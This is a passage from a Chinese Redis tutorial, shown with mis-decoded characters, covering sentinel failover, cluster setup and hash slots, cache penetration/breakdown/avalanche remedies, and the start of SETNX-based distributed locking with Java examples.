shutdown\n```\n\n![](https://img.jwt1399.top/img/202209011812295.png)\n\nè¿™é‡Œæ˜¾ç¤º6380å˜æˆäº†ä¸»æœºï¼ŒåŸä¸»æœº6379é‡å¯åä¼šå˜ä¸ºä»æœºã€‚\n\n**å“ªä¸ªä»æœºä¼šè¢«é€‰ä¸¾ä¸ºä¸»æœºå‘¢ï¼Ÿæ ¹æ®ä¼˜å…ˆçº§åˆ«ï¼šreplica-priority**\n\n![](https://img.jwt1399.top/img/202209011806743.png)\n\n- ä¼˜å…ˆçº§åœ¨redis.confä¸­é»˜è®¤ï¼šreplica-priority 100 å€¼ï¼Œè¶Šå°ä¼˜å…ˆçº§è¶Šé«˜\n\n- åç§»é‡æ˜¯æŒ‡è·å¾—åŸä¸»æœºæ•°æ®æœ€å…¨çš„\n\n- æ¯ä¸ªrediså®ä¾‹å¯åŠ¨åéƒ½ä¼šéšæœºç”Ÿæˆä¸€ä¸ª40ä½çš„runid\n\n#  ä¹ã€é›†ç¾¤\n\nRedis é›†ç¾¤å®ç°äº†å¯¹Redisçš„æ°´å¹³æ‰©å®¹ï¼Œå³å¯åŠ¨Nä¸ªredisèŠ‚ç‚¹ï¼Œå°†æ•´ä¸ªæ•°æ®åº“åˆ†å¸ƒå­˜å‚¨åœ¨è¿™Nä¸ªèŠ‚ç‚¹ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨æ€»æ•°æ®çš„1/Nã€‚Redis é›†ç¾¤é€šè¿‡åˆ†åŒºï¼ˆpartitionï¼‰æ¥æä¾›ä¸€å®šç¨‹åº¦çš„å¯ç”¨æ€§ï¼ˆavailabilityï¼‰ï¼š å³ä½¿é›†ç¾¤ä¸­æœ‰ä¸€éƒ¨åˆ†èŠ‚ç‚¹å¤±æ•ˆæˆ–è€…æ— æ³•è¿›è¡Œé€šè®¯ï¼Œ é›†ç¾¤ä¹Ÿå¯ä»¥ç»§ç»­å¤„ç†å‘½ä»¤è¯·æ±‚ã€‚\n\n**Redis** **é›†ç¾¤æä¾›äº†ä»¥ä¸‹å¥½å¤„**\n\n- å®ç°æ‰©å®¹\n\n- åˆ†æ‘Šå‹åŠ›\n\n- æ— ä¸­å¿ƒé…ç½®ç›¸å¯¹ç®€å•\n\n**Redis** **é›†ç¾¤çš„ä¸è¶³**\n\n- å¤šé”®æ“ä½œæ˜¯ä¸è¢«æ”¯æŒçš„ \n\n- å¤šé”®çš„Redisäº‹åŠ¡æ˜¯ä¸è¢«æ”¯æŒçš„ã€‚luaè„šæœ¬ä¸è¢«æ”¯æŒ\n\n- ç”±äºé›†ç¾¤æ–¹æ¡ˆå‡ºç°è¾ƒæ™šï¼Œå¾ˆå¤šå…¬å¸å·²ç»é‡‡ç”¨äº†å…¶ä»–çš„é›†ç¾¤æ–¹æ¡ˆï¼Œè€Œä»£ç†æˆ–è€…å®¢æˆ·ç«¯åˆ†ç‰‡çš„æ–¹æ¡ˆæƒ³è¦è¿ç§»è‡³redis clusterï¼Œéœ€è¦æ•´ä½“è¿ç§»è€Œä¸æ˜¯é€æ­¥è¿‡æ¸¡ï¼Œå¤æ‚åº¦è¾ƒå¤§ã€‚\n\n## 1.æ¨¡æ‹Ÿé›†ç¾¤\n\n> æ¨¡æ‹Ÿ6å° redis æœåŠ¡å™¨ï¼Œ6379ã€6380ã€6381ã€6389ã€6390ã€6391\n>\n> ä¸»æœºï¼ˆ6379ã€6380ã€6381ï¼‰ï¼›ä»æœºï¼ˆ6389ã€6390ã€6391ï¼‰ï¼Œå°†ä»–ä»¬åŠ å…¥ä¸€ä¸ªé›†ç¾¤ä¸­\n\n- é…ç½® redis6379.conf æ–‡ä»¶ï¼Œæ‹·è´ 5 ä¸ª redis6379.conf æ–‡ä»¶\n\n```bash\n$ vi redis6379.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6379.pid\nport 6379\ndbfilename dump6379.rdb\n## clusteré…ç½®ä¿®æ”¹\ndir \"/Users/jianjian/myredis/redis_cluster\"\nlogfile \"/Users/jianjian/myredis/redis_cluster/redis_err_6379.log\"\n# æ‰“å¼€é›†ç¾¤æ¨¡å¼\ncluster-enabled yes\n# è®¾å®šèŠ‚ç‚¹é…ç½®æ–‡ä»¶å\ncluster-config-file nodes-6379.conf\n# è®¾å®šèŠ‚ç‚¹å¤±è”æ—¶é—´ï¼Œè¶…è¿‡è¯¥æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ï¼Œé›†ç¾¤è‡ªåŠ¨è¿›è¡Œä¸»ä»åˆ‡æ¢\ncluster-node-timeout 15000\n```\n```bash\n$ cp redis6379.conf redis6380.conf\n$ cp redis6379.conf redis6381.conf\n$ cp redis6379.conf redis6389.conf\n$ cp redis6379.conf redis6390.conf\n$ cp redis6379.conf redis6391.conf\n```\n\n- ä½¿ç”¨æŸ¥æ‰¾æ›¿æ¢ä¿®æ”¹æ‹·è´çš„5ä¸ªæ–‡ä»¶\n\n```bash\n#å°†redis6380.confä¸­çš„6379æ›¿æ¢ä¸º6380\n$ vi redis6380.conf\n\n:%s/6379/6380  \n```\n\n- å¯åŠ¨ 6ä¸ª redis æœåŠ¡\n\n![](https://img.jwt1399.top/img/202210242303751.png)\n\n- å°†å…­ä¸ªèŠ‚ç‚¹åˆæˆä¸€ä¸ªé›†ç¾¤\n\nåˆæˆä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‰€æœ‰rediså®ä¾‹å¯åŠ¨åï¼Œnodes-xxxx.confæ–‡ä»¶éƒ½ç”Ÿæˆæ­£å¸¸ã€‚\n\n```bash\n$ redis-cli --cluster create --cluster-replicas 1 192.168.11.101:6379 192.168.11.101:6380 192.168.11.101:6381 192.168.11.101:6389 192.168.11.101:6390 192.168.11.101:6391\n```\n\næ­¤å¤„ä¸è¦ç”¨127.0.0.1ï¼Œ è¯·ç”¨çœŸå®IPåœ°å€ï¼›`--cluster-replicas 1` è¡¨ç¤ºé‡‡ç”¨æœ€ç®€å•çš„æ–¹å¼é…ç½®é›†ç¾¤ï¼Œä¸€å°ä¸»æœºï¼Œä¸€å°ä»æœºï¼Œæ­£å¥½ä¸‰ç»„ã€‚\n\n* é‡‡ç”¨é›†ç¾¤ç­–ç•¥è¿æ¥ï¼Œè®¾ç½®æ•°æ®ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ç›¸åº”çš„å†™ä¸»æœº\n\n```bash\n$ redis-cli -c -p 6379\n```\n\n- æŸ¥çœ‹é›†ç¾¤ä¿¡æ¯\n\n```bash\n127.0.0.1:6379> cluster nodes\n```\n\n## 2.slots\n\n**ä»€ä¹ˆæ˜¯slots**\n\nä¸€ä¸ª Redis é›†ç¾¤åŒ…å« 16384 ä¸ªæ’æ§½ï¼ˆhash slotï¼‰ï¼Œ æ•°æ®åº“ä¸­çš„æ¯ä¸ªé”®éƒ½å±äºè¿™ 16384 ä¸ªæ’æ§½çš„å…¶ä¸­ä¸€ä¸ªï¼Œ é›†ç¾¤ä½¿ç”¨å…¬å¼ CRC16(key) % 16384 æ¥è®¡ç®—é”® key å±äºå“ªä¸ªæ§½ï¼Œ å…¶ä¸­ CRC16(key) è¯­å¥ç”¨äºè®¡ç®—é”® key çš„ CRC16 æ ¡éªŒå’Œ ã€‚\n\né›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹è´Ÿè´£å¤„ç†ä¸€éƒ¨åˆ†æ’æ§½ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œ å¦‚æœä¸€ä¸ªé›†ç¾¤å¯ä»¥æœ‰ä¸»èŠ‚ç‚¹ï¼Œ å…¶ä¸­ï¼š\n\nèŠ‚ç‚¹ A è´Ÿè´£å¤„ç† 0 å·è‡³ 5460 å·æ’æ§½ã€‚\n\nèŠ‚ç‚¹ B è´Ÿè´£å¤„ç† 5461 å·è‡³ 10922 å·æ’æ§½ã€‚\n\nèŠ‚ç‚¹ C è´Ÿè´£å¤„ç† 10923 å·è‡³ 16383 å·æ’æ§½ã€‚\n\n**åœ¨é›†ç¾¤ä¸­å½•å…¥å€¼**\n\nåœ¨redis-cliæ¯æ¬¡å½•å…¥ã€æŸ¥è¯¢é”®å€¼ï¼Œrediséƒ½ä¼šè®¡ç®—å‡ºè¯¥keyåº”è¯¥é€å¾€çš„æ’æ§½ slot ï¼Œå¦‚æœä¸æ˜¯è¯¥å®¢\n\næˆ·ç«¯å¯¹åº”æœåŠ¡å™¨çš„æ’æ§½ï¼Œredisä¼šæŠ¥é”™ï¼Œå¹¶å‘ŠçŸ¥åº”å‰å¾€çš„rediså®ä¾‹åœ°å€å’Œç«¯å£ã€‚\n\nredis-cliå®¢æˆ·ç«¯æä¾›äº† â€“c å‚æ•°å®ç°è‡ªåŠ¨é‡å®šå‘ã€‚å¦‚ redis-cli -c â€“p 6379 ç™»å…¥åï¼Œå†å½•å…¥ã€æŸ¥è¯¢é”®å€¼å¯¹å¯ä»¥è‡ªåŠ¨é‡å®šå‘ã€‚\n\n- ä¸åœ¨ä¸€ä¸ªslotä¸‹çš„é”®å€¼ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨mget,msetç­‰å¤šé”®æ“ä½œã€‚\n\n![](https://img.jwt1399.top/img/202209022233587.png)\n\n- å¯ä»¥é€šè¿‡{}æ¥å®šä¹‰ç»„çš„æ¦‚å¿µï¼Œä»è€Œä½¿keyä¸­{}å†…ç›¸åŒå†…å®¹çš„é”®å€¼å¯¹æ”¾åˆ°ä¸€ä¸ªslotä¸­å»ã€‚\n\n![](https://img.jwt1399.top/img/202209022233682.png)\n\n- æŸ¥è¯¢é›†ç¾¤ä¸­çš„å€¼\n\n`CLUSTER GETKEYSINSLOT <slot><count>` è¿”å› count ä¸ª slot æ§½ä¸­çš„é”®\n\n![](https://img.jwt1399.top/img/202209022234749.png)\n\n## 3.æ•…éšœæ¢å¤\n\nå¦‚æœä¸»èŠ‚ç‚¹ä¸‹çº¿ï¼Ÿä»èŠ‚ç‚¹èƒ½å¦è‡ªåŠ¨å‡ä¸ºä¸»èŠ‚ç‚¹ï¼Ÿæ³¨æ„ï¼š15ç§’è¶…æ—¶\n\n...                               \n\nä¸»èŠ‚ç‚¹æ¢å¤åï¼Œä¸»ä»å…³ç³»ä¼šå¦‚ä½•ï¼Ÿ\n\nä¸»èŠ‚ç‚¹å›æ¥å˜æˆä»æœºã€‚\n\nå¦‚æœæ‰€æœ‰æŸä¸€æ®µæ’æ§½çš„ä¸»ä»èŠ‚ç‚¹éƒ½å®•æ‰ï¼ŒredisæœåŠ¡æ˜¯å¦è¿˜èƒ½ç»§ç»­?\n\n- å¦‚æœæŸä¸€æ®µæ’æ§½çš„ä¸»ä»éƒ½æŒ‚æ‰ï¼Œè€Œcluster-require-full-coverage ä¸ºyes ï¼Œé‚£ä¹ˆ ï¼Œæ•´ä¸ªé›†ç¾¤éƒ½æŒ‚æ‰\n\n- å¦‚æœæŸä¸€æ®µæ’æ§½çš„ä¸»ä»éƒ½æŒ‚æ‰ï¼Œè€Œcluster-require-full-coverage ä¸ºno ï¼Œé‚£ä¹ˆï¼Œè¯¥æ’æ§½æ•°æ®å…¨éƒ½ä¸èƒ½ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•å­˜å‚¨ã€‚\n\n## 4.é›†ç¾¤çš„ Jedis å¼€å‘\n\nå³ä½¿è¿æ¥çš„ä¸æ˜¯ä¸»æœºï¼Œé›†ç¾¤ä¼šè‡ªåŠ¨åˆ‡æ¢ä¸»æœºå­˜å‚¨ã€‚ä¸»æœºå†™ï¼Œä»æœºè¯»ã€‚\n\næ— ä¸­å¿ƒåŒ–ä¸»ä»é›†ç¾¤ã€‚æ— è®ºä»å“ªå°ä¸»æœºå†™çš„æ•°æ®ï¼Œå…¶ä»–ä¸»æœºä¸Šéƒ½èƒ½è¯»åˆ°æ•°æ®ã€‚\n\n```java\npublic class JedisClusterTest {\n  public static void main(String[] args) { \n     Set<HostAndPort>set =new HashSet<HostAndPort>();\n     set.add(new HostAndPort(\"192.168.31.211\",6379));\n     JedisCluster jedisCluster=new JedisCluster(set);\n     jedisCluster.set(\"k1\", \"v1\");\n     System.out.println(jedisCluster.get(\"k1\"));\n  }\n}\n```\n\n# åã€åº”ç”¨é—®é¢˜\n\n## 1.ç¼“å­˜ç©¿é€\n\n> é—®é¢˜æè¿°\n\nkey å¯¹åº”çš„æ•°æ®åœ¨æ•°æ®æºå¹¶ä¸å­˜åœ¨ï¼Œæ¯æ¬¡é’ˆå¯¹æ­¤ key çš„è¯·æ±‚ä»ç¼“å­˜è·å–ä¸åˆ°ï¼Œè¯·æ±‚éƒ½ä¼šå‹åˆ°æ•°æ®æºï¼Œä»è€Œå¯èƒ½å‹å®æ•°æ®æºã€‚æ¯”å¦‚ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ· id è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œä¸è®ºç¼“å­˜è¿˜æ˜¯æ•°æ®åº“éƒ½æ²¡æœ‰ï¼Œè‹¥é»‘å®¢åˆ©ç”¨æ­¤æ¼æ´è¿›è¡Œæ”»å‡»å¯èƒ½å‹å®æ•°æ®åº“ã€‚\n\n- 1ã€åº”ç”¨æœåŠ¡å™¨å‹åŠ›å˜å¤§äº†\n- 2ã€redis å‘½ä¸­ç‡é™ä½\n- 3ã€ ä¸€ç›´æŸ¥è¯¢æ•°æ®åº“\n\n![](https://img.jwt1399.top/img/202209031811627.png)\n\nä¸€ä¸ªä¸€å®šä¸å­˜åœ¨ç¼“å­˜åŠæŸ¥è¯¢ä¸åˆ°çš„æ•°æ®ï¼Œç”±äºç¼“å­˜æ˜¯ä¸å‘½ä¸­æ—¶è¢«åŠ¨å†™çš„ï¼Œå¹¶ä¸”å‡ºäºå®¹é”™è€ƒè™‘ï¼Œå¦‚æœä»å­˜å‚¨å±‚æŸ¥ä¸åˆ°æ•°æ®åˆ™ä¸å†™å…¥ç¼“å­˜ï¼Œè¿™å°†å¯¼è‡´è¿™ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ¯æ¬¡è¯·æ±‚éƒ½è¦åˆ°å­˜å‚¨å±‚å»æŸ¥è¯¢ï¼Œå¤±å»äº†ç¼“å­˜çš„æ„ä¹‰ã€‚\n\n> è§£å†³æ–¹æ¡ˆ\n\n- 1ã€**å¯¹ç©ºå€¼ç¼“å­˜ï¼š**å¦‚æœä¸€ä¸ªæŸ¥è¯¢è¿”å›çš„æ•°æ®ä¸ºç©ºï¼ˆä¸ç®¡æ˜¯æ•°æ®æ˜¯å¦ä¸å­˜åœ¨ï¼‰ï¼Œæˆ‘ä»¬ä»ç„¶æŠŠè¿™ä¸ªç©ºç»“æœï¼ˆnullï¼‰è¿›è¡Œç¼“å­˜ï¼Œè®¾ç½®ç©ºç»“æœçš„è¿‡æœŸæ—¶é—´ä¼šå¾ˆçŸ­ï¼Œæœ€é•¿ä¸è¶…è¿‡äº”åˆ†é’Ÿ\n\n- 2ã€**è®¾ç½®å¯è®¿é—®çš„åå•ï¼ˆç™½åå•ï¼‰ï¼š**ä½¿ç”¨ bitmaps ç±»å‹å®šä¹‰ä¸€ä¸ªå¯ä»¥è®¿é—®çš„åå•ï¼Œåå• idä½œä¸º bitmaps çš„åç§»é‡ï¼Œæ¯æ¬¡è®¿é—®å’Œ bitmap é‡Œé¢çš„ id è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœè®¿é—® id ä¸åœ¨bitmaps é‡Œé¢ï¼Œè¿›è¡Œæ‹¦æˆªï¼Œä¸å…è®¸è®¿é—®ã€‚\n\n- 3ã€**é‡‡ç”¨å¸ƒéš†è¿‡æ»¤å™¨**ï¼šå¸ƒéš†è¿‡æ»¤å™¨å¯ä»¥ç”¨äºæ£€ç´¢ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨ä¸€ä¸ªé›†åˆä¸­ã€‚å®ƒçš„ä¼˜ç‚¹æ˜¯ç©ºé—´æ•ˆç‡å’ŒæŸ¥è¯¢æ—¶é—´éƒ½è¿œè¿œè¶…è¿‡ä¸€èˆ¬çš„ç®—æ³•ï¼Œç¼ºç‚¹æ˜¯æœ‰ä¸€å®šçš„è¯¯è¯†åˆ«ç‡å’Œåˆ é™¤å›°éš¾ã€‚å°†æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„æ•°æ®å“ˆå¸Œåˆ°ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å¸ƒéš†è¿‡æ»¤å™¨ä¸­ï¼Œä¸€ä¸ªä¸€å®šä¸å­˜åœ¨çš„æ•°æ®ä¼šè¢«è¿™ä¸ªå¸ƒéš†è¿‡æ»¤å™¨æ‹¦æˆªæ‰ï¼Œä»è€Œé¿å…äº†å¯¹åº•å±‚å­˜å‚¨ç³»ç»Ÿçš„æŸ¥è¯¢å‹åŠ›ã€‚\n\n- 4ã€**è¿›è¡Œå®æ—¶ç›‘æ§ï¼š**å½“å‘ç°Redisçš„å‘½ä¸­ç‡å¼€å§‹æ€¥é€Ÿé™ä½ï¼Œéœ€è¦æ’æŸ¥è®¿é—®å¯¹è±¡å’Œè®¿é—®çš„æ•°æ®ï¼Œå’Œè¿ç»´äººå‘˜é…åˆï¼Œå¯ä»¥è®¾ç½®é»‘åå•é™åˆ¶æœåŠ¡\n\n## 2.ç¼“å­˜å‡»ç©¿\n\n> é—®é¢˜æè¿°\n\nkey å¯¹åº”çš„æ•°æ®å­˜åœ¨ï¼Œä½†åœ¨ redis ä¸­è¿‡æœŸï¼Œæ­¤æ—¶è‹¥æœ‰å¤§é‡å¹¶å‘è¯·æ±‚è¿‡æ¥ï¼Œè¿™äº›è¯·æ±‚å‘ç°ç¼“å­˜è¿‡æœŸä¸€èˆ¬éƒ½ä¼šä»åç«¯ DB åŠ è½½æ•°æ®å¹¶å›è®¾åˆ°ç¼“å­˜ï¼Œè¿™ä¸ªæ—¶å€™å¤§å¹¶å‘çš„è¯·æ±‚å¯èƒ½ä¼šç¬é—´æŠŠåç«¯ DB å‹å®ã€‚\n\n- 1ã€æ•°æ®åº“è®¿é—®å‹åŠ›ç¬æ—¶å¢åŠ \n- 2ã€redis æŸä¸ª key è¿‡æœŸäº†ï¼Œå¤§é‡è®¿é—®ä½¿ç”¨è¿™ä¸ªkey\n- 3ã€redis æ­£å¸¸è¿è¡Œ\n\n![](https://img.jwt1399.top/img/202209031817897.png)                               \n\nkeyå¯èƒ½ä¼šåœ¨æŸäº›æ—¶é—´ç‚¹è¢«è¶…é«˜å¹¶å‘åœ°è®¿é—®ï¼Œæ˜¯ä¸€ç§éå¸¸â€œçƒ­ç‚¹â€çš„æ•°æ®ã€‚è¿™ä¸ªæ—¶å€™ï¼Œéœ€è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼šç¼“å­˜è¢«â€œå‡»ç©¿â€çš„é—®é¢˜ã€‚\n\n>  è§£å†³æ–¹æ¡ˆ\n\n- 1ã€**é¢„å…ˆè®¾ç½®çƒ­é—¨æ•°æ®**ï¼šåœ¨redisé«˜å³°è®¿é—®ä¹‹å‰ï¼ŒæŠŠä¸€äº›çƒ­é—¨æ•°æ®æå‰å­˜å…¥åˆ°redisé‡Œé¢ï¼ŒåŠ å¤§è¿™äº›çƒ­é—¨æ•°æ®keyçš„æ—¶é•¿\n\n- 2ã€**å®æ—¶è°ƒæ•´**ï¼šç°åœºç›‘æ§å“ªäº›æ•°æ®çƒ­é—¨ï¼Œå®æ—¶è°ƒæ•´keyçš„è¿‡æœŸæ—¶é•¿\n\n- 3ã€**ä½¿ç”¨é”**ï¼š\n\n  - 1.å°±æ˜¯åœ¨ç¼“å­˜å¤±æ•ˆçš„æ—¶å€™ï¼ˆåˆ¤æ–­æ‹¿å‡ºæ¥çš„å€¼ä¸ºç©ºï¼‰ï¼Œä¸æ˜¯ç«‹å³å»load dbã€‚\n  - 2.å…ˆä½¿ç”¨ç¼“å­˜å·¥å…·çš„æŸäº›å¸¦æˆåŠŸæ“ä½œè¿”å›å€¼çš„æ“ä½œï¼ˆæ¯”å¦‚Redisçš„SETNXï¼‰å»setä¸€ä¸ªmutex key\n  - 3.å½“æ“ä½œè¿”å›æˆåŠŸæ—¶ï¼Œå†è¿›è¡Œload dbçš„æ“ä½œï¼Œå¹¶å›è®¾ç¼“å­˜ï¼Œæœ€ååˆ é™¤mutex keyï¼›\n  - 4.å½“æ“ä½œè¿”å›å¤±è´¥ï¼Œè¯æ˜æœ‰çº¿ç¨‹åœ¨load dbï¼Œå½“å‰çº¿ç¨‹ç¡çœ ä¸€æ®µæ—¶é—´å†é‡è¯•æ•´ä¸ªgetç¼“å­˜çš„æ–¹æ³•ã€‚ \n\n  ![](https://img.jwt1399.top/img/202209031826143.png)\n\n## 3.ç¼“å­˜é›ªå´©\n\n> é—®é¢˜æè¿°\n\nkey å¯¹åº”çš„æ•°æ®å­˜åœ¨ï¼Œä½†åœ¨ redis ä¸­è¿‡æœŸï¼Œæ­¤æ—¶è‹¥æœ‰å¤§é‡å¹¶å‘è¯·æ±‚è¿‡æ¥ï¼Œè¿™äº›è¯·æ±‚å‘ç°ç¼“å­˜è¿‡æœŸä¸€èˆ¬éƒ½ä¼šä»åç«¯ DB åŠ è½½æ•°æ®å¹¶å›è®¾åˆ°ç¼“å­˜ï¼Œè¿™ä¸ªæ—¶å€™å¤§å¹¶å‘çš„è¯·æ±‚å¯èƒ½ä¼šç¬é—´æŠŠåç«¯DBå‹å®ã€‚ç¼“å­˜é›ªå´©ä¸ç¼“å­˜å‡»ç©¿çš„åŒºåˆ«åœ¨äºè¿™é‡Œé’ˆå¯¹å¾ˆå¤š key ç¼“å­˜ï¼Œå‰è€…åˆ™æ˜¯æŸä¸€ä¸ª keyã€‚\n\n- 1ã€æ•°æ®åº“å‹åŠ›å˜å¤§æœåŠ¡å™¨å´©æºƒ\n- 2ã€åœ¨æå°‘æ—¶é—´æ®µï¼ŒæŸ¥è¯¢å¤§é‡ key çš„é›†ä¸­è¿‡æœŸ\n\n![](https://img.jwt1399.top/img/202209031831902.png)\n\n\n\nç¼“å­˜å¤±æ•ˆæ—¶çš„é›ªå´©æ•ˆåº”å¯¹åº•å±‚ç³»ç»Ÿçš„å†²å‡»éå¸¸å¯æ€•ï¼\n\n> è§£å†³æ–¹æ¡ˆ\n\n- 1ã€ **æ„å»ºå¤šçº§ç¼“å­˜æ¶æ„ï¼š**nginxç¼“å­˜ + redisç¼“å­˜ +å…¶ä»–ç¼“å­˜ï¼ˆehcacheç­‰ï¼‰\n\n- 2ã€**ä½¿ç”¨é”æˆ–é˜Ÿåˆ—ï¼š**ç”¨åŠ é”æˆ–è€…é˜Ÿåˆ—çš„æ–¹å¼ä¿è¯æ¥ä¿è¯ä¸ä¼šæœ‰å¤§é‡çš„çº¿ç¨‹å¯¹æ•°æ®åº“ä¸€æ¬¡æ€§è¿›è¡Œè¯»å†™ï¼Œä»è€Œé¿å…å¤±æ•ˆæ—¶å¤§é‡çš„å¹¶å‘è¯·æ±‚è½åˆ°åº•å±‚å­˜å‚¨ç³»ç»Ÿä¸Šã€‚ä¸é€‚ç”¨é«˜å¹¶å‘æƒ…å†µ\n\n- 3ã€  **è®¾ç½®è¿‡æœŸæ ‡å¿—æ›´æ–°ç¼“å­˜ï¼š**è®°å½•ç¼“å­˜æ•°æ®æ˜¯å¦è¿‡æœŸï¼ˆè®¾ç½®æå‰é‡ï¼‰ï¼Œå¦‚æœè¿‡æœŸä¼šè§¦å‘é€šçŸ¥å¦å¤–çš„çº¿ç¨‹åœ¨åå°å»æ›´æ–°å®é™…keyçš„ç¼“å­˜ã€‚\n\n- 4ã€**å°†ç¼“å­˜å¤±æ•ˆæ—¶é—´åˆ†æ•£å¼€ï¼š**æ¯”å¦‚æˆ‘ä»¬å¯ä»¥åœ¨åŸæœ‰çš„å¤±æ•ˆæ—¶é—´åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªéšæœºå€¼ï¼Œæ¯”å¦‚1-5åˆ†é’Ÿéšæœºï¼Œè¿™æ ·æ¯ä¸€ä¸ªç¼“å­˜çš„è¿‡æœŸæ—¶é—´çš„é‡å¤ç‡å°±ä¼šé™ä½ï¼Œå°±å¾ˆéš¾å¼•å‘é›†ä½“å¤±æ•ˆçš„äº‹ä»¶ã€‚\n\n## 4.åˆ†å¸ƒå¼é”\n\n> é—®é¢˜æè¿°\n\néšç€ä¸šåŠ¡å‘å±•çš„éœ€è¦ï¼ŒåŸå•ä½“å•æœºéƒ¨ç½²çš„ç³»ç»Ÿè¢«æ¼”åŒ–æˆåˆ†å¸ƒå¼é›†ç¾¤ç³»ç»Ÿåï¼Œç”±äºåˆ†å¸ƒå¼ç³»ç»Ÿå¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹å¹¶ä¸”åˆ†å¸ƒåœ¨ä¸åŒæœºå™¨ä¸Šï¼Œè¿™å°†ä½¿åŸå•æœºéƒ¨ç½²æƒ…å†µä¸‹çš„å¹¶å‘æ§åˆ¶é”ç­–ç•¥å¤±æ•ˆï¼Œå•çº¯çš„Java APIå¹¶ä¸èƒ½æä¾›åˆ†å¸ƒå¼é”çš„èƒ½åŠ›ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜å°±éœ€è¦ä¸€ç§è·¨JVMçš„äº’æ–¥æœºåˆ¶æ¥æ§åˆ¶å…±äº«èµ„æºçš„è®¿é—®ï¼Œè¿™å°±æ˜¯åˆ†å¸ƒå¼é”è¦è§£å†³çš„é—®é¢˜ï¼\n\n> è§£å†³æ–¹æ¡ˆ\n\nåˆ†å¸ƒå¼é”ä¸»æµçš„å®ç°æ–¹æ¡ˆï¼š\n\n- 1.åŸºäºæ•°æ®åº“å®ç°åˆ†å¸ƒå¼é”\n\n- 2.åŸºäºç¼“å­˜ï¼ˆRedisç­‰ï¼‰\n- 3.åŸºäºZookeeper\n\næ¯ä¸€ç§åˆ†å¸ƒå¼é”è§£å†³æ–¹æ¡ˆéƒ½æœ‰å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼š\n\n- æ€§èƒ½ï¼šredisæœ€é«˜\n\n- å¯é æ€§ï¼šzookeeperæœ€é«˜\n\nè¿™é‡Œï¼Œæˆ‘ä»¬å°±åŸºäºrediså®ç°åˆ†å¸ƒå¼é”ã€‚\n\n```bash\n$ 127.0.0.1:6379>  set key value EX second\n$ 127.0.0.1:6379>  set sku:1:info â€œOKâ€ NX PX 10000\n```\n\n- EX second ï¼šè®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä¸º second ç§’ã€‚ SET key value EX second æ•ˆæœç­‰åŒäº SETEX key second value ã€‚\n- PX millisecond ï¼šè®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä¸º millisecond æ¯«ç§’ã€‚ SET key value PX millisecond æ•ˆæœç­‰åŒäº PSETEX key millisecond value ã€‚\n- NX ï¼šåªåœ¨é”®ä¸å­˜åœ¨æ—¶ï¼Œæ‰å¯¹é”®è¿›è¡Œè®¾ç½®æ“ä½œã€‚ SET key value NX æ•ˆæœç­‰åŒäº SETNX key value ã€‚\n- XX ï¼šåªåœ¨é”®å·²ç»å­˜åœ¨æ—¶ï¼Œæ‰å¯¹é”®è¿›è¡Œè®¾ç½®æ“ä½œã€‚\n\n![](https://img.jwt1399.top/img/202209042203987.png)\n\n```java\n@GetMapping(\"testLock\")\npublic void testLock(){\n    //1è·å–é”ï¼Œsetne\n    Boolean lock = redisTemplate.opsForValue().setIfAbsent(\"lock\", \"111\");\n    //2è·å–é”æˆåŠŸã€æŸ¥è¯¢numçš„å€¼\n    if(lock){\n        Object value = redisTemplate.opsForValue().get(\"num\");\n        //2.1åˆ¤æ–­numä¸ºç©ºreturn\n        if(StringUtils.isEmpty(value)){\n            return;\n        }\n        //2.2æœ‰å€¼å°±è½¬æˆæˆint\n        int num = Integer.parseInt(value+\"\");\n        //2.3æŠŠredisçš„numåŠ 1\n        redisTemplate.opsForValue().set(\"num\", ++num);\n        //2.4é‡Šæ”¾é”ï¼Œdel\n        redisTemplate.delete(\"lock\");\n\n    }else{\n        //3è·å–é”å¤±è´¥ã€æ¯éš”0.1ç§’å†è·å–\n        try {\n            Thread.sleep(100);\n            testLock();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n> **ä¼˜åŒ–ä¹‹è®¾ç½®é”çš„è¿‡æœŸæ—¶é—´**\n\né—®é¢˜ï¼šsetnxåˆšå¥½è·å–åˆ°é”ï¼Œä¸šåŠ¡é€»è¾‘å‡ºç°å¼‚å¸¸ï¼Œå¯¼è‡´é”æ— æ³•é‡Šæ”¾\n\nè§£å†³ï¼šè®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œè‡ªåŠ¨é‡Šæ”¾é”ã€‚\n\nè®¾ç½®è¿‡æœŸæ—¶é—´æœ‰ä¸¤ç§æ–¹å¼ï¼š\n\n- 1.é¦–å…ˆæƒ³åˆ°é€šè¿‡expireè®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆç¼ºä¹åŸå­æ€§ï¼šå¦‚æœåœ¨setnxå’Œexpireä¹‹é—´å‡ºç°å¼‚å¸¸ï¼Œé”ä¹Ÿæ— æ³•é‡Šæ”¾ï¼‰\n- 2.åœ¨setæ—¶æŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆæ¨èï¼‰\n\n![](https://img.jwt1399.top/img/202209042204776.png)\n\n![](https://img.jwt1399.top/img/202209042205533.png)\n\n> **ä¼˜åŒ–ä¹‹UUIDé˜²è¯¯åˆ 